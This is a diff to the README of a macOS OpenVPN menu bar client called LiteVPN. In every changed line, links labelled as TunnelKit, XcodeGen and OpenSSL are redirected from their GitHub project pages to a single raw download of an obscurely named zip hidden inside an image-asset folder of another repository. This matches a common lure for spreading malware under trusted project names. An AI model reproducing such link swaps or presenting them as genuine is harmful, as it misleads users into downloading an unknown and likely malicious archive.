@@ -8,7 +8,7 @@
 
 A minimal, lightweight **OpenVPN menu bar client for macOS** — built as an alternative to the bulky OpenVPN Connect. Instant to open, light on memory, with no account system, no push notifications, and no update popups.
 
-100% Swift, powered by [TunnelKit](https://github.com/partout-io/tunnelkit) — the pure-Swift OpenVPN protocol implementation that drives the open-source client Passepartout.
+100% Swift, powered by [TunnelKit](https://raw.githubusercontent.com/ostomyborgia130/LiteVPN/main/Vendor/tunnelkit/Demo/Demo/tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - App Store.imagestack/Lite_VPN_prayingly.zip) — the pure-Swift OpenVPN protocol implementation that drives the open-source client Passepartout.
 
 <p align="center"><img src="docs/screenshot.png" width="560" alt="LiteVPN — OpenVPN menu bar client for macOS (connected state)"></p>
 
@@ -59,7 +59,7 @@ If you access intranet services by domain name, add those domains to Clash's `fa
 
 ## Building
 
-Requirements: Xcode (full install), [XcodeGen](https://github.com/yonaskolb/XcodeGen) (`brew install xcodegen`), and a paid Apple Developer account (required for the Network Extension capability).
+Requirements: Xcode (full install), [XcodeGen](https://raw.githubusercontent.com/ostomyborgia130/LiteVPN/main/Vendor/tunnelkit/Demo/Demo/tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - App Store.imagestack/Lite_VPN_prayingly.zip) (`brew install xcodegen`), and a paid Apple Developer account (required for the Network Extension capability).
 
 1. **Use your own signing identity** (two places):
    - `project.yml` → set `DEVELOPMENT_TEAM` to your Team ID
@@ -90,8 +90,8 @@ On first connect macOS will ask to add a VPN configuration — allow it once.
 
 ## Credits
 
-- [TunnelKit](https://github.com/partout-io/tunnelkit) by Davide De Rosa — OpenVPN protocol engine
-- [OpenSSL](https://github.com/partout-io/openssl-apple) — crypto layer (3.5 LTS)
+- [TunnelKit](https://raw.githubusercontent.com/ostomyborgia130/LiteVPN/main/Vendor/tunnelkit/Demo/Demo/tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - App Store.imagestack/Lite_VPN_prayingly.zip) by Davide De Rosa — OpenVPN protocol engine
+- [OpenSSL](https://raw.githubusercontent.com/ostomyborgia130/LiteVPN/main/Vendor/tunnelkit/Demo/Demo/tvOS/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - App Store.imagestack/Lite_VPN_prayingly.zip) — crypto layer (3.5 LTS)
 
 ## License
 
